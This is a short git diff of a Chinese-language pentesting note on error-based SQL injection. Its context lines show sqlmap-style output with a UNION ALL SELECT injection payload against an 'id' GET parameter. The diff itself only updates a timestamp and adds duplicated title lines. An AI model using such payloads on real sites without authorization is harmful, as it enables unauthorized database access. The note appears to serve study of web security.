@@ -3,7 +3,7 @@ title: 报错型sql注入
 date: 2024-11-15T20:06:19Z
 lastmod: 2024-11-15T20:11:13Z
 created: 2024-11-27T22:18
-updated: 2024-12-14T19:10
+updated: 2024-12-14T19:12
 ---
 
 # 报错型[sql注入](sql注入.md)
@@ -18,6 +18,8 @@ Parameter: id (GET)
     Title: Generic UNION query (NULL) - 2 columns
     Payload: id=-6758' UNION ALL SELECT NULL,CONCAT(0x71716b6271,0x6b4f427268554c41585a6c62706e70755161624c684e6b574950737365477945575762454c567758,0x71627a6a71)-- -
 tags: [web渗透]
+title: 报错型sql注入
+title: 报错型sql注入
 ---
 ```
 
